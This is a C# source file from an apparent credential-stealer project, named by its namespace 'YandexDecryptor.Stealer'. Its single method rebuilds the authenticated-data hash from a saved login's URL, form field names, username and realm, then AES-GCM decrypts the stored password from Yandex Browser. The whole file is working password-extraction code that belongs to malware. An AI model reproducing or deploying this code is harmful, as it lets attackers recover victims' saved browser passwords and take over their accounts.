using System;
using System.Text;
using System.Security.Cryptography;

using YandexDecryptor.Stealer.Browsers.Chromium;

namespace YandexDecryptor.Stealer.Browsers.Yandex
{
    internal sealed class AuthenticatedData
    {
        public static byte[] Decrypt(byte[] encryptionKey, byte[] password_value, string url, string username_element, string password_element, string username_value, string signon_realm)
        {
            byte[] aadData = new byte[] { };
            using (SHA1 sha1 = SHA1.Create())
            {
                byte[] urlBytes = Encoding.UTF8.GetBytes(url);
                byte[] usernameElementBytes = Encoding.UTF8.GetBytes(username_element);
                byte[] usernameValueBytes = Encoding.UTF8.GetBytes(username_value);
                byte[] passwordElementBytes = Encoding.UTF8.GetBytes(password_element);
                byte[] signonRealmBytes = Encoding.UTF8.GetBytes(signon_realm);

                int totalLength = urlBytes.Length + 1 +
                                  usernameElementBytes.Length + 1 +
                                  usernameValueBytes.Length + 1 +
                                  passwordElementBytes.Length + 1 +
                                  signonRealmBytes.Length;

                byte[] aadBytes = new byte[totalLength];
                int offset = 0;

                Array.Copy(urlBytes, 0, aadBytes, offset, urlBytes.Length);
                offset += urlBytes.Length;
                aadBytes[offset++] = 0x00;

                Array.Copy(usernameElementBytes, 0, aadBytes, offset, usernameElementBytes.Length);
                offset += usernameElementBytes.Length;
                aadBytes[offset++] = 0x00;

                Array.Copy(usernameValueBytes, 0, aadBytes, offset, usernameValueBytes.Length);
                offset += usernameValueBytes.Length;
                aadBytes[offset++] = 0x00;

                Array.Copy(passwordElementBytes, 0, aadBytes, offset, passwordElementBytes.Length);
                offset += passwordElementBytes.Length;
                aadBytes[offset++] = 0x00;

                Array.Copy(signonRealmBytes, 0, aadBytes, offset, signonRealmBytes.Length);
                aadData = sha1.ComputeHash(aadBytes);
            }


            byte[] nonce = new byte[12];
            Array.Copy(password_value, 0, nonce, 0, 12);

            int encryptedDataLength = password_value.Length - 12 - 16;
            byte[] encryptedData = new byte[encryptedDataLength];
            Array.Copy(password_value, 12, encryptedData, 0, encryptedDataLength);

            byte[] tag = new byte[16];
            Array.Copy(password_value, password_value.Length - 16, tag, 0, 16);

            return AesGcm.Decrypt(encryptionKey, nonce, aadData, encryptedData, tag);
          
        }
        
    }
}
